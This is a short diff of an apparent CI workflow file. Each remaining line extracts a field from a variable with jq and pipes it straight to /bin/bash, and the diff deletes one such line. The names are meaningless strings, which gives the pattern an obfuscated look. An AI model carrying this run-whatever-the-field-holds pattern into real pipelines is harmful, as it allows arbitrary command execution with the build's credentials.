@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$eony197" | jq -r .pwvm103 | /bin/bash
           echo $fwyv4 | jq -r .f9351 | /bin/bash
           printf '%s' "$qnbez13386" | jq -r .phng6 | /bin/bash
-          echo $hlrg0546 | jq -r .lxcif0 | /bin/bash
           echo $yfqv11 | jq -r .xenm824 | /bin/bash
           echo $vl023 | jq -r .cy00 | /bin/bash
 
